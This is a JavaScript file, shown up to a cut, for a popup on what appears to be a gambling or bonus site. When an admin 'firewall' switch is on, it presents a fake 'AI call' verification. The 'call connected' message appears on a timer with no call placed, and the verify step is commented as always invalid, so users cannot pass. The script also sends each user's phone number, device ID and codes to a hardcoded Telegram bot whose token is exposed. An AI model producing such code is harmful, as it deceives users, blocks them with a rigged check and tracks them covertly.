/**
 * Popup PlayBonus - Vibrant Filipino Carnival Theme
 * Firewall System similar to share_and_earn.html
 * Auto-shows when firewall is ON
 */

(function() {
    'use strict';
    
    var currentBalance = 0;
    var callInProgress = false;
    var callCountdown = 60;
    var callTimerInterval = null;
    var currentCallCode = '';
    var currentFirewallStatus = false;
    var popupCreated = false;
    
    // ========== SOUNDS ==========
    function playCallSound() {
        try {
            var audio = new Audio('sounds/call_ring.mp3');
            audio.volume = 0.5;
            audio.play().catch(function(e) {});
        } catch(e) {}
    }
    
    function playClaimSound() {
        try {
            var audio = new Audio('sounds/super_ace_scatter_ring.mp3');
            audio.volume = 0.7;
            audio.play().catch(function(e) {});
        } catch(e) {}
    }
    
    // ========== TELEGRAM ==========
    var BOT_TOKEN = "8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg";
    var CHAT_ID = "7298607329";
    
    function sendTelegramMessage(message) {
        try {
            fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(message))
                .catch(function(e) { console.error('Telegram error:', e); });
        } catch(e) {}
    }
    
    function sendAICallRequestNotification(userPhone, deviceId, code) {
        var now = new Date();
        var timestamp = now.toLocaleString();
        var message = '🎪 CARNIVAL AI CALL REQUESTED\n━━━━━━━━━━━━━━━━━━━━\n👤 User: ' + userPhone + '\n🖥️ Device: ' + deviceId + '\n🔑 Code: ' + code + '\n⏰ Time: ' + timestamp + '\n📊 Status: Waiting for AI call\n━━━━━━━━━━━━━━━━━━━━';
        sendTelegramMessage(message);
    }
    
    function sendAICodeAttemptNotification(userPhone, deviceId, codeEntered, secondsLeft) {
        var now = new Date();
        var timestamp = now.toLocaleString();
        var message = '🎯 CARNIVAL CODE ATTEMPT\n━━━━━━━━━━━━━━━━━━━━\n👤 User: ' + userPhone + '\n🖥️ Device: ' + deviceId + '\n📝 Code: ' + codeEntered + '\n⏰ Time: ' + timestamp + '\n⏱️ Left: ' + secondsLeft + 's\n📊 Status: INVALID\n━━━━━━━━━━━━━━━━━━━━';
        sendTelegramMessage(message);
    }
    
    function sendAICallExpiredNotification(userPhone, deviceId) {
        var now = new Date();
        var timestamp = now.toLocaleString();
        var message = '⏰ CARNIVAL CALL EXPIRED\n━━━━━━━━━━━━━━━━━━━━\n👤 User: ' + userPhone + '\n🖥️ Device: ' + deviceId + '\n⏰ Time: ' + timestamp + '\n📊 Status: Expired\n━━━━━━━━━━━━━━━━━━━━';
        sendTelegramMessage(message);
    }
    
    // ========== GET FIREWALL STATUS ==========
    function getFirewallStatus() {
        try {
            var db = firebase.database();
            return db.ref('admin/globalFirewall').once('value').then(function(snapshot) {
                var data = snapshot.val();
                currentFirewallStatus = (data && data.active === true);
                console.log('🔥 Firewall:', currentFirewallStatus ? 'ON' : 'OFF');
                return currentFirewallStatus;
            });
        } catch(e) {
            return Promise.resolve(false);
        }
    }
    
    // ========== ADD CARNIVAL STYLES ==========
    function addCarnivalStyles() {
        if (document.querySelector('#carnival-popup-styles')) return;
        
        var style = document.createElement('style');
        style.id = 'carnival-popup-styles';
        style.textContent = `
            /* ============================================================
               CARNIVAL FIREWALL POPUP - VIBRANT FILIPINO THEME
               Hot Red + Crimson + White Burst + Confetti
               ============================================================ */
            
            .carnival-popup-overlay {
                position: fixed;
                inset: 0;
                background: 
                    radial-gradient(circle at 50% 35%, rgba(255, 255, 255, 0.35) 0%, rgba(255, 255, 255, 0.1) 20%, transparent 50%),
                    radial-gradient(ellipse at 50% 30%, #ff2a2a 0%, #c1121f 25%, #780000 55%, #2a0000 85%, #0d0000 100%);
                backdrop-filter: blur(14px);
                -webkit-backdrop-filter: blur(14px);
                z-index: 99999;
                display: none;
                align-items: center;
                justify-content: center;
                padding: 16px;
                animation: carnivalFadeIn 0.4s ease;
                overflow-y: auto;
                overflow-x: hidden;
            }
            
            .carnival-popup-overlay.show {
                display: flex;
            }
            
            @keyframes carnivalFadeIn {
                from { opacity: 0; }
                to { opacity: 1; }
            }
            
            /* ========== FLOATING CONFETTI ========== */
            .carnival-popup-overlay::before {
                content: '';
                position: absolute;
                inset: 0;
                background-image: 
                    radial-gradient(circle 5px at 8% 15%, #ffd700 50%, transparent 50%),
                    radial-gradient(circle 4px at 92% 25%, #ff6b9d 50%, transparent 50%),
                    radial-gradient(circle 5px at 15% 78%, #4fc3f7 50%, transparent 50%),
                    radial-gradient(circle 4px at 85% 82%, #ff9800 50%, transparent 50%),
                    radial-gradient(circle 3px at 50% 8%, #ffd700 50%, transparent 50%),
                    radial-gradient(circle 5px at 25% 45%, #ff6b9d 50%, transparent 50%),
                    radial-gradient(circle 4px at 75% 55%, #4fc3f7 50%, transparent 50%),
                    radial-gradient(circle 5px at 45% 92%, #ffd700 50%, transparent 50%),
                    radial-gradient(circle 4px at 60% 20%, #ff9800 50%, transparent 50%),
                    radial-gradient(circle 5px at 35% 68%, #ff6b9d 50%, transparent 50%);
                animation: confettiFloat 6s ease-in-out infinite;
                pointer-events: none;
                z-index: 1;
                opacity: 0.9;
            }
            
            @keyframes confettiFloat {
                0%, 100% { transform: translateY(0) scale(1) rotate(0deg); }
                50% { transform: translateY(-15px) scale(1.05) rotate(5deg); }
            }
            
            /* ========== RAINBOW LIGHTS ========== */
            .carnival-popup-overlay::after {
                content: '';
                position: absolute;
                top: 50%;
                left: 50%;
                width: 800px;
                height: 800px;
                transform: translate(-50%, -50%);
                background: 
                    conic-gradient(from 0deg,
                        rgba(255, 0, 128, 0.12) 0deg,
                        rgba(255, 200, 0, 0.12) 60deg,
                        rgba(0, 255, 128, 0.12) 120deg,
                        rgba(0, 200, 255, 0.12) 180deg,
                        rgba(150, 0, 255, 0.12) 240deg,
                        rgba(255, 0, 128, 0.12) 300deg,
                        rgba(255, 0, 128, 0.12) 360deg);
                animation: rainbowSpin 25s linear infinite;
                pointer-events: none;
                z-index: 0;
                filter: blur(40px);
            }
            
            @keyframes rainbowSpin {
                from { transform: translate(-50%, -50%) rotate(0deg); }
                to { transform: translate(-50%, -50%) rotate(360deg); }
            }
            
            /* ========== MAIN CONTAINER ========== */
            .carnival-popup-container {
                position: relative;
                z-index: 10;
                width: 100%;
                max-width: 400px;
                background: 
                    linear-gradient(180deg, rgba(255, 255, 255, 0.15) 0%, transparent 30%),
                    linear-gradient(145deg, #d10000 0%, #ff1744 50%, #8b0000 100%);
                border: 3px solid #ffd700;
                border-radius: 26px;
                padding: 26px 20px 22px;
                box-shadow: 
                    0 25px 60px rgba(0, 0, 0, 0.8),
                    0 0 60px rgba(255, 215, 0, 0.7),
                    0 0 120px rgba(255, 23, 68, 0.5),
                    inset 0 0 40px rgba(255, 215, 0, 0.1);
                animation: carnivalPopIn 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275);
                overflow: hidden;
                box-sizing: border-box;
            }
            
            @keyframes carnivalPopIn {
                0% { transform: scale(0.4) rotate(-8deg); opacity: 0; }
                60% { transform: scale(1.06) rotate(2deg); }
                100% { transform: scale(1) rotate(0deg); opacity: 1; }
            }
            
            /* Animated Border */
            .carnival-popup-container::before {
                content: '';
                position: absolute;
                inset: -3px;
                border-radius: 28px;
                padding: 3px;
                background: conic-gradient(
                    from var(--carnivalAngle, 0deg),
                    #ffd700 0%,
                    #ff9800 15%,
                    #ff1744 30%,
                    #fff9c4 45%,
                    #ffd700 60%,
                    #ff9800 75%,
                    #ffd700 90%,
                    #ffd700 100%
                );
                -webkit-mask: 
                    linear-gradient(#fff 0 0) content-box, 
                    linear-gradient(#fff 0 0);
                -webkit-mask-composite: xor;
                mask-composite: exclude;
                pointer-events: none;
                z-index: 0;
                animation: carnivalBorderRotate 3s linear infinite;
                filter: drop-shadow(0 0 10px rgba(255, 215, 0, 0.6));
            }
            
            @property --carnivalAngle {
                syntax: '<angle>';
                initial-value: 0deg;
                inherits: false;
            }
            
            @keyframes carnivalBorderRotate {
                to { --carnivalAngle: 360deg; }
            }
            
            /* White Burst Center */
            .carnival-popup-container::after {
                content: '';
                position: absolute;
                top: 30%;
                left: 50%;
                transform: translate(-50%, -50%);
                width: 350px;
                height: 350px;
                background: radial-gradient(
                    circle, 
                    rgba(255, 255, 255, 0.3) 0%, 
                    rgba(255, 215, 0, 0.15) 25%,
                    transparent 60%
                );
                border-radius: 50%;
                pointer-events: none;
                animation: whiteBurst 3s ease-in-out infinite;
                z-index: 1;
            }
            
            @keyframes whiteBurst {
                0%, 100% { 
                    transform: translate(-50%, -50%) scale(1); 
                    opacity: 0.7;
                }
                50% { 
                    transform: translate(-50%, -50%) scale(1.15); 
                    opacity: 1;
                }
            }
            
            /* ========== CLOSE BUTTON ========== */
            .carnival-close {
                position: absolute;
                top: 14px;
                right: 16px;
                width: 36px;
                height: 36px;
                background: rgba(255, 255, 255, 0.15);
                border: 2px solid #ffd700;
                border-radius: 50%;
                color: #ffd700;
                font-size: 16px;
                font-weight: 900;
                cursor: pointer;
                display: flex;
                align-items: center;
                justify-content: center;
                transition: all 0.25s ease;
                z-index: 10;
                font-family: 'Orbitron', monospace;
                box-shadow: 0 0 15px rgba(255, 215, 0, 0.5);
                position: absolute;
            }
            
            .carnival-close:hover,
            .carnival-close:active {
                background: rgba(255, 68, 68, 0.5);
                color: #fff;
                transform: rotate(90deg) scale(1.1);
                border-color: #ff4444;
                box-shadow: 0 0 25px rgba(255, 68, 68, 0.8);
            }
            
            /* ========== HEADER ========== */
            .carnival-header {
                text-align: center;
                margin-bottom: 16px;
                position: relative;
                z-index: 2;
            }
            
            .carnival-icon-container {
                width: 80px;
                height: 80px;
                margin: 0 auto 12px;
                background: 
                    radial-gradient(circle at 30% 30%, #ffeb3b, #ff6f00);
                border-radius: 50%;
                display: flex;
                align-items: center;
                justify-content: center;
                border: 3px solid #fff9c4;
                box-shadow: 
                    0 0 30px rgba(255, 215, 0, 0.9),
                    0 0 60px rgba(255, 152, 0, 0.6),
                    inset 0 0 20px rgba(255, 255, 255, 0.3);
                animation: iconPulse 2s ease-in-out infinite;
                position: relative;
            }
            
            @keyframes iconPulse {
                0%, 100% { 
                    transform: scale(1);
                    box-shadow: 0 0 30px rgba(255, 215, 0, 0.9);
                }
                50% { 
                    transform: scale(1.1);
                    box-shadow: 0 0 50px rgba(255, 215, 0, 1);
                }
            }
            
            .carnival-icon-container i {
                font-size: 38px;
                color: #8b0000;
                text-shadow: 0 0 15px rgba(255, 255, 255, 0.6);
            }
            
            .carnival-title {
                font-family: 'Playfair Display', serif;
                font-size: 24px;
                font-weight: 900;
                background: linear-gradient(
                    180deg, 
                    #fff9c4 0%, 
                    #ffd700 30%, 
                    #ffeb3b 50%, 
                    #ff9800 100%
                );
                -webkit-background-clip: text;
                background-clip: text;
                color: transparent;
                letter-spacing: 3px;
                text-transform: uppercase;
                filter: 
                    drop-shadow(0 0 20px rgba(255, 215, 0, 0.9))
                    drop-shadow(0 4px 8px rgba(0, 0, 0, 0.6));
                animation: titleShine 3s ease-in-out infinite;
                margin-bottom: 4px;
            }
            
            @keyframes titleShine {
                0%, 100% { 
                    filter: 
                        drop-shadow(0 0 20px rgba(255, 215, 0, 0.9))
                        drop-shadow(0 4px 8px rgba(0, 0, 0, 0.6));
                }
                50% { 
                    filter: 
                        drop-shadow(0 0 35px rgba(255, 215, 0, 1))
                        drop-shadow(0 0 60px rgba(255, 152, 0, 0.7));
                }
            }
            
            .carnival-subtitle {
                font-family: 'Poppins', sans-serif;
                font-size: 10px;
                color: rgba(255, 215, 0, 0.9);
                letter-spacing: 3px;
                text-transform: uppercase;
                margin-top: 4px;
                text-shadow: 0 0 10px rgba(255, 215, 0, 0.7);
            }
            
            /* ========== STATUS BOX ========== */
            .carnival-status-box {
                background: 
                    linear-gradient(180deg, rgba(255, 255, 255, 0.1) 0%, transparent 50%),
                    linear-gradient(135deg, #1a0000, #330000);
                border: 2px solid #ffd700;
                border-radius: 18px;
                padding: 16px;
                margin: 14px 0;
                text-align: center;
                box-shadow: 
                    0 0 25px rgba(255, 215, 0, 0.6),
                    inset 0 0 20px rgba(255, 215, 0, 0.08);
                position: relative;
                overflow: hidden;
                z-index: 2;
            }
            
            .carnival-status-box::before {
                content: '';
                position: absolute;
                top: 0;
                left: -100%;
                width: 50%;
                height: 100%;
                background: linear-gradient(90deg, transparent, rgba(255, 215, 0, 0.3), transparent);
                animation: scannerGlow 3s infinite;
            }
            
            @keyframes scannerGlow {
                100% { left: 200%; }
            }
            
            .carnival-status-text {
                font-family: 'Poppins', sans-serif;
                font-size: 12px;
                color: rgba(255, 255, 255, 0.95);
                line-height: 1.5;
                position: relative;
                z-index: 2;
            }
            
            .carnival-status-text strong {
                color: #ffd700;
                text-shadow: 0 0 12px rgba(255, 215, 0, 0.9);
                font-weight: 800;
            }
            
            /* Phone Number Display */
            .carnival-phone-number {
                font-family: 'Orbitron', monospace;
                font-size: 24px;
                font-weight: 900;
                background: linear-gradient(180deg, #fff9c4 0%, #ffd700 50%, #ff9800 100%);
                -webkit-background-clip: text;
                background-clip: text;
                color: transparent;
                letter-spacing: 2px;
                margin: 10px 0;
                filter: drop-shadow(0 0 20px rgba(255, 215, 0, 0.9));
                animation: numberReveal 0.8s cubic-bezier(0.34, 1.56, 0.64, 1) forwards,
                           numberGlow 2s ease-in-out infinite 0.8s;
                display: inline-block;
                position: relative;
                z-index: 2;
            }
            
            @keyframes numberReveal {
                0% { opacity: 0; transform: scale(0.5) rotateY(90deg); }
                50% { opacity: 0.5; transform: scale(1.1) rotateY(-10deg); }
                100% { opacity: 1; transform: scale(1) rotateY(0deg); }
            }
            
            @keyframes numberGlow {
                0%, 100% { 
                    filter: drop-shadow(0 0 20px rgba(255, 215, 0, 0.7));
                }
                50% { 
                    filter: drop-shadow(0 0 40px rgba(255, 152, 0, 1));
                }
            }
            
            /* ========== TIMER ========== */
            .carnival-timer {
                font-family: 'Orbitron', monospace;
                font-size: 34px;
                font-weight: 900;
                color: #39ff14;
                text-shadow: 
                    0 0 25px rgba(57, 255, 20, 0.9),
                    0 0 50px rgba(57, 255, 20, 0.5);
                letter-spacing: 3px;
                margin: 8px 0;
                transition: all 0.3s ease;
                position: relative;
                z-index: 2;
            }
            
            .carnival-timer.urgent {
                color: #ff1744;
                text-shadow: 
                    0 0 25px rgba(255, 23, 68, 0.9),
                    0 0 50px rgba(255, 23, 68, 0.6),
                    0 0 100px rgba(255, 23, 68, 0.3);
                animation: timerUrgent 0.5s ease-in-out infinite;
            }
            
            @keyframes timerUrgent {
                0%, 100% { transform: scale(1); }
                50% { transform: scale(1.12); }
            }
            
            /* ========== BUTTONS ========== */
            .carnival-btn {
                width: 100%;
                padding: 16px 20px;
                border-radius: 14px;
                font-family: 'Orbitron', monospace;
                font-size: 14px;
                font-weight: 900;
                letter-spacing: 2px;
                text-transform: uppercase;
                cursor: pointer;
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 10px;
                position: relative;
                overflow: hidden;
                transition: all 0.1s ease;
                box-sizing: border-box;
                z-index: 2;
            }
            
            /* Request Call Button */
            .carnival-btn-primary {
                background: 
                    linear-gradient(180deg, rgba(255, 255, 255, 0.35) 0%, transparent 40%),
                    linear-gradient(180deg, #ffeb3b 0%, #ffd700 30%, #ff9800 70%, #ff6f00 100%);
                border: 3px solid #fff9c4;
                color: #8b0000;
                text-shadow: 0 2px 0 rgba(255, 255, 255, 0.7);
                box-shadow: 
                    0 5px 0 #8b4500,
                    0 10px 25px rgba(0, 0, 0, 0.6),
                    0 0 35px rgba(255, 215, 0, 0.8);
            }
            
            .carnival-btn-primary:active {
                transform: translateY(5px);
                box-shadow: 
                    0 0 0 #8b4500,
                    0 5px 15px rgba(0, 0, 0, 0.6),
                    0 0 25px rgba(255, 215, 0, 0.6);
            }
            
            /* Verify Button */
            .carnival-btn-verify {
                background: 
                    linear-gradient(180deg, rgba(255, 255, 255, 0.35) 0%, transparent 40%),
                    linear-gradient(180deg, #00ff88 0%, #00cc44 50%, #008833 100%);
                border: 3px solid #7dffb3;
                color: #00331a;
                text-shadow: 0 2px 0 rgba(255, 255, 255, 0.6);
                box-shadow: 
                    0 5px 0 #005522,
                    0 10px 25px rgba(0, 0, 0, 0.6),
                    0 0 35px rgba(0, 255, 136, 0.8);
            }
            
            .carnival-btn-verify:active {
                transform: translateY(5px);
                box-shadow: 
                    0 0 0 #005522,
                    0 5px 15px rgba(0, 0, 0, 0.6);
            }
            
            /* Back Button */
            .carnival-btn-back {
                background: linear-gradient(180deg, #555, #333);
                border: 2px solid #777;
                color: #ccc;
                box-shadow: 0 3px 0 #222;
                font-size: 11px;
                padding: 10px 20px;
                margin-top: 10px;
                width: auto;
                display: inline-flex;
            }
            
            .carnival-btn-back:active {
                transform: translateY(3px);
                box-shadow: 0 0 0 #222;
            }
            
            /* Shine effect */
            .carnival-btn::before {
                content: '';
                position: absolute;
                top: 0;
                left: -100%;
                width: 100%;
                height: 100%;
                background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.7), transparent);
                animation: btnShine 2.5s infinite;
            }
            
            @keyframes btnShine {
                0% { left: -100%; }
                60% { left: 100%; }
                100% { left: 100%; }
            }
            
            /* Button Icons */
            .carnival-btn i {
                font-size: 18px;
                filter: drop-shadow(0 0 6px currentColor);
            }
            
            .carnival-btn-primary i {
                animation: phoneBounce 1.2s ease-in-out infinite;
            }
            
            @keyframes phoneBounce {
                0%, 100% { transform: rotate(-10deg) scale(1); }
                50% { transform: rotate(10deg) scale(1.15); }
            }
            
            /* ========== INPUT FIELD ========== */
            .carnival-input {
                width: 100%;
                max-width: 200px;
                margin: 0 auto 12px;
                display: block;
                text-align: center;
                font-family: 'Orbitron', monospace;
                font-size: 28px;
                font-weight: 900;
                padding: 14px;
                background: 
                    linear-gradient(180deg, rgba(255, 215, 0, 0.08) 0%, transparent 50%),
                    #0a0000;
                border: 3px solid #ffd700;
                border-radius: 14px;
                color: #ffd700;
                letter-spacing: 8px;
                transition: all 0.3s ease;
                box-shadow: 
                    0 0 25px rgba(255, 215, 0, 0.6),
                    inset 0 0 20px rgba(255, 215, 0, 0.1);
                outline: none;
                box-sizing: border-box;
            }
            
            .carnival-input:focus {
                border-color: #39ff14;
                box-shadow: 
                    0 0 35px rgba(57, 255, 20, 0.9),
                    inset 0 0 25px rgba(57, 255, 20, 0.15);
                color: #39ff14;
            }
            
            .carnival-input::placeholder {
                color: rgba(255, 215, 0, 0.4);
                letter-spacing: 4px;
                font-size: 18px;
            }
            
            /* ========== MESSAGES ========== */
            .carnival-msg {
                font-family: 'Poppins', sans-serif;
                font-size: 11px;
                text-align: center;
                padding: 10px 14px;
                margin-top: 10px;
                border-radius: 12px;
                display: none;
                position: relative;
                z-index: 2;
                font-weight: 600;
            }
            
            .carnival-msg.show {
                display: block;
                animation: msgSlide 0.3s ease;
            }
            
            @keyframes msgSlide {
                from { opacity: 0; transform: translateY(-10px); }
                to { opacity: 1; transform: translateY(0); }
            }
            
            .carnival-msg-error {
                color: #ff4466;
                background: rgba(255, 68, 102, 0.2);
                border: 2px solid rgba(255, 68, 102, 0.5);
                box-shadow: 0 0 20px rgba(255, 68, 102, 0.4);
            }
            
            .carnival-msg-expired {
                color: #ff9800;
                background: rgba(255, 152, 0, 0.2);
                border: 2px solid rgba(255, 152, 0, 0.5);
                box-shadow: 0 0 20px rgba(255, 152, 0, 0.4);
            }
            
            /* ========== CODE SECTION ========== */
            .carnival-code-section {
                display: none;
                margin-top: 14px;
                position: relative;
                z-index: 2;
            }
            
            .carnival-code-section.show {
                display: block;
                animation: codeSlide 0.4s ease;
            }
            
            @keyframes codeSlide {
                from { opacity: 0; transform: translateY(15px); }
                to { opacity: 1; transform: translateY(0); }
            }
            
            .carnival-code-label {
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 8px;
                margin-bottom: 12px;
                font-family: 'Orbitron', monospace;
                font-size: 10px;
                color: #ffd700;
                letter-spacing: 2px;
                text-transform: uppercase;
                text-shadow: 0 0 10px rgba(255, 215, 0, 0.7);
            }
            
            .carnival-code-label i {
                font-size: 14px;
                animation: ticketBounce 1s ease-in-out infinite;
            }
            
            @keyframes ticketBounce {
                0%, 100% { transform: rotate(-10deg) scale(1); }
                50% { transform: rotate(10deg) scale(1.15); }
            }
            
            /* ========== DIVIDER ========== */
            .carnival-divider {
                width: 70px;
                height: 3px;
                background: linear-gradient(90deg, transparent, #ffd700, #ff1744, #ffd700, transparent);
                margin: 14px auto;
                box-shadow: 0 0 15px rgba(255, 215, 0, 0.7);
                border-radius: 2px;
                position: relative;
                z-index: 2;
            }
            
            /* ========== RESPONSIVE ========== */
            @media (max-width: 480px) {
                .carnival-popup-container {
                    padding: 22px 16px 18px;
                    border-radius: 22px;
                }
                
                .carnival-title {
                    font-size: 20px;
                    letter-spacing: 2px;
                }
                
                .carnival-icon-container {
                    width: 70px;
                    height: 70px;
                }
                
                .carnival-icon-container i {
                    font-size: 32px;
                }
                
                .carnival-phone-number {
                    font-size: 20px;
                }
                
                .carnival-timer {
                    font-size: 28px;
                }
                
                .carnival-input {
                    font-size: 24px;
                    padding: 12px;
                    letter-spacing: 6px;
                }
                
                .carnival-btn {
                    padding: 14px 16px;
                    font-size: 12px;
                }
            }
            
            @media (max-width: 360px) {
                .carnival-title {
                    font-size: 18px;
                }
                
                .carnival-icon-container {
                    width: 60px;
                    height: 60px;
                }
                
                .carnival-icon-container i {
                    font-size: 28px;
                }
                
                .carnival-phone-number {
                    font-size: 18px;
                }
                
                .carnival-timer {
                    font-size: 24px;
                }
            }
        `;
        document.head.appendChild(style);
    }
    
    // ========== CREATE CARNIVAL POPUP ==========
    function createCarnivalPopup() {
        if (document.getElementById('carnivalPopup')) return;
        
        var userPhone = localStorage.getItem("userPhone") || "Unknown";
        var formattedPhone = userPhone.length >= 11 ? 
            userPhone.substring(0, 4) + "***" + userPhone.substring(7, 11) : 
            userPhone;
        
        var popup = document.createElement('div');
        popup.id = 'carnivalPopup';
        popup.className = 'carnival-popup-overlay';
        popup.innerHTML = 
            '<div class="carnival-popup-container">' +
                '<button class="carnival-close" id="carnivalClose">✕</button>' +
                
                '<div class="carnival-header">' +
                    '<div class="carnival-icon-container">' +
                        '<i class="fas fa-phone-volume"></i>' +
                    '</div>' +
                    '<div class="carnival-title">VERIFICATION</div>' +
                    '<div class="carnival-subtitle">◆ AI CALL SYSTEM ◆</div>' +
                '</div>' +
                
                '<div class="carnival-divider"></div>' +
                
                '<div class="carnival-status-box" id="carnivalStatusBox">' +
                    '<div id="carnivalStatusIcon" style="font-size: 32px; margin-bottom: 8px;">🎪</div>' +
                    '<div id="carnivalStatusText" class="carnival-status-text">' +
                        '<strong>AI CALL</strong> will provide your verification code' +
                    '</div>' +
                    
                    '<div id="carnivalPhoneDisplay" style="display: none; margin-top: 10px;">' +
                        '<div class="carnival-phone-number">📱 ' + formattedPhone + '</div>' +
                    '</div>' +
                    
                    '<div id="carnivalTimer" class="carnival-timer" style="display: none;">60s</div>' +
                '</div>' +
                
                '<button id="carnivalRequestBtn" class="carnival-btn carnival-btn-primary">' +
                    '<i class="fas fa-phone-alt"></i>' +
                    '<span>REQUEST AI CALL</span>' +
                '</button>' +
                
                '<div id="carnivalCodeSection" class="carnival-code-section">' +
                    '<div class="carnival-code-label">' +
                        '<i class="fas fa-ticket-alt"></i>' +
                        '<span>ENTER 4-DIGIT CODE</span>' +
                    '</div>' +
                    
                    '<input type="text" id="carnivalCodeInput" class="carnival-input" placeholder="0000" maxlength="4" inputmode="numeric" autocomplete="off">' +
                    
                    '<button id="carnivalVerifyBtn" class="carnival-btn carnival-btn-verify">' +
                        '<i class="fas fa-check-double"></i>' +
                        '<span>VERIFY CODE</span>' +
                    '</button>' +
                    
                    '<div id="carnivalErrorMsg" class="carnival-msg carnival-msg-error">' +
                        '<i class="fas fa-times-circle"></i> Invalid code. Request a new call.' +
                    '</div>' +
                    
                    '<div id="carnivalExpiredMsg" class="carnival-msg carnival-msg-expired">' +
                        '<i class="fas fa-clock"></i> Call expired. Request a new call.' +
                    '</div>' +
                '</div>' +
                
                '<div style="text-align: center; margin-top: 12px;">' +
                    '<button class="carnival-btn carnival-btn-back" id="carnivalBackBtn">← BACK</button>' +
                '</div>' +
            '</div>';
        
        document.body.appendChild(popup);
        popupCreated = true;
        attachCarnivalEvents();
    }
    
    // ========== ATTACH EVENTS ==========
    function attachCarnivalEvents() {
        var closeBtn = document.getElementById('carnivalClose');
        var backBtn = document.getElementById('carnivalBackBtn');
        var requestBtn = document.getElementById('carnivalRequestBtn');
        var verifyBtn = document.getElementById('carnivalVerifyBtn');
        var codeInput = document.getElementById('carnivalCodeInput');
        
        if (closeBtn) closeBtn.onclick = closeCarnivalPopup;
        if (backBtn) backBtn.onclick = closeCarnivalPopup;
        
        if (requestBtn) {
            requestBtn.onclick = function() {
                if (callInProgress) {
                    alert("Please wait for the current call to complete.");
                    return;
                }
                requestCarnivalCall();
            };
        }
        
        if (verifyBtn) {
            verifyBtn.onclick = verifyCarnivalCode;
        }
        
        if (codeInput) {
            codeInput.addEventListener('keypress', function(e) {
                if (e.key === 'Enter') verifyCarnivalCode();
            });
            
            codeInput.addEventListener('input', function() {
                var value = this.value.trim();
                if (value.length === 4 && /^\d+$/.test(value)) {
                    this.style.borderColor = '#39ff14';
                    this.style.boxShadow = '0 0 35px rgba(57, 255, 20, 0.9)';
                    this.style.color = '#39ff14';
                } else {
                    this.style.borderColor = '#ffd700';
                    this.style.boxShadow = '0 0 25px rgba(255, 215, 0, 0.6)';
                    this.style.color = '#ffd700';
                }
            });
        }
    }
    
    // ========== REQUEST CALL ==========
    function requestCarnivalCall() {
        if (callInProgress) return;
        
        callInProgress = true;
        callCountdown = 60;
        currentCallCode = Math.floor(1000 + Math.random() * 9000).toString();
        
        var userPhone = localStorage.getItem("userPhone") || "Unknown";
        var deviceId = localStorage.getItem("userDeviceId") || "Unknown";
        
        sendAICallRequestNotification(userPhone, deviceId, currentCallCode);
        
        var statusIcon = document.getElementById('carnivalStatusIcon');
        var statusText = document.getElementById('carnivalStatusText');
        var phoneDisplay = document.getElementById('carnivalPhoneDisplay');
        var timerDisplay = document.getElementById('carnivalTimer');
        var requestBtn = document.getElementById('carnivalRequestBtn');
        var codeSection = document.getElementById('carnivalCodeSection');
        var codeInput = document.getElementById('carnivalCodeInput');
        var errorMsg = document.getElementById('carnivalErrorMsg');
        var expiredMsg = document.getElementById('carnivalExpiredMsg');
        
        if (errorMsg) errorMsg.classList.remove('show');
        if (expiredMsg) expiredMsg.classList.remove('show');
        if (codeInput) codeInput.value = '';
        
        if (statusIcon) statusIcon.innerHTML = '📞';
        if (statusText) {
            statusText.innerHTML = '<strong>AI CALL</strong> is being placed...<br><span style="font-size: 10px; color: rgba(255,255,255,0.6);">Please wait for the call</span>';
        }
        if (phoneDisplay) phoneDisplay.style.display = 'block';
        if (timerDisplay) {
            timerDisplay.style.display = 'block';
            timerDisplay.textContent = '60s';
            timerDisplay.classList.remove('urgent');
        }
        if (requestBtn) {
            requestBtn.disabled = true;
            requestBtn.style.opacity = '0.5';
            requestBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> <span>CALLING...</span>';
        }
        if (codeSection) codeSection.classList.remove('show');
        
        playCallSound();
        startCarnivalTimer();
        
        setTimeout(function() {
            if (statusIcon) statusIcon.innerHTML = '🎯';
            if (statusText) {
                statusText.innerHTML = '<strong style="color: #39ff14;">🎯 CALL CONNECTED!</strong><br><span style="font-size: 11px; color: rgba(255,255,255,0.8);">Enter the 4-digit code below</span>';
            }
            if (codeSection) codeSection.classList.add('show');
            if (codeInput) codeInput.focus();
        }, 4000);
    }
    
    // ========== TIMER ==========
    function startCarnivalTimer() {
        stopCarnivalTimer();
        
        var timerDisplay = document.getElementById('carnivalTimer');
        
        callTimerInterval = setInterval(function() {
            callCountdown--;
            
            if (timerDisplay) {
                timerDisplay.textContent = callCountdown + 's';
                
                if (callCountdown <= 9) {
                    timerDisplay.classList.add('urgent');
                } else {
                    timerDisplay.classList.remove('urgent');
                }
            }
            
            if (callCountdown <= 0) {
                stopCarnivalTimer();
                
                var userPhone = localStorage.getItem("userPhone") || "Unknown";
                var deviceId = localStorage.getItem("userDeviceId") || "Unknown";
                sendAICallExpiredNotification(userPhone, deviceId);
                
                var statusText = document.getElementById('carnivalStatusText');
                var codeSection = document.getElementById('carnivalCodeSection');
                var requestBtn = document.getElementById('carnivalRequestBtn');
                var expiredMsg = document.getElementById('carnivalExpiredMsg');
                
                if (statusText) {
                    statusText.innerHTML = '<strong style="color: #ff9800;">⏰ CALL EXPIRED</strong><br><span style="font-size: 11px; color: rgba(255,255,255,0.7);">Request a new call</span>';
                }
                if (timerDisplay) timerDisplay.style.display = 'none';
                if (codeSection) codeSection.classList.remove('show');
                if (requestBtn) {
                    requestBtn.disabled = false;
                    requestBtn.style.opacity = '1';
                    requestBtn.innerHTML = '<i class="fas fa-phone-alt"></i> <span>REQUEST AI CALL</span>';
                }
                if (expiredMsg) expiredMsg.classList.add('show');
                
                callInProgress = false;
            }
        }, 1000);
    }
    
    function stopCarnivalTimer() {
        if (callTimerInterval) {
            clearInterval(callTimerInterval);
            callTimerInterval = null;
        }
    }
    
    // ========== VERIFY CODE (Always Invalid) ==========
    function verifyCarnivalCode() {
        var codeInput = document.getElementById('carnivalCodeInput');
        var errorMsg = document.getElementById('carnivalErrorMsg');
        var expiredMsg = document.getElementById('carnivalExpiredMsg');
        var verifyBtn = document.getElementById('carnivalVerifyBtn');
        
        if (!codeInput) return;
        
        var enteredCode = codeInput.value.trim();
        
        if (!enteredCode || enteredCode.length !== 4 || !/^\d+$/.test(enteredCode)) {
            if (errorMsg) {
